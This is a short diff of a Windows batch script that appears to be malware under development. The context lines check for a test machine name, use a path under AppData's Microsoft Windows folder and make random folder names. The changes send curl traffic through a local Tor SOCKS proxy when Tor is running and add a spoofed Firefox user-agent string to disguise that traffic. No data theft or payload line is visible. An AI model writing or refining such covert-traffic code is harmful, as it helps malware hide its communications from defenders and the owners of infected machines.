@@ -15,8 +15,8 @@ if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windo
 rem TESTING <
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
-  set "proxy=--tlsv1"
+if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050 -A "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0"") else (
+  set "proxy=--tlsv1 -A "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0""
 )
 
 set "folder=%random%"
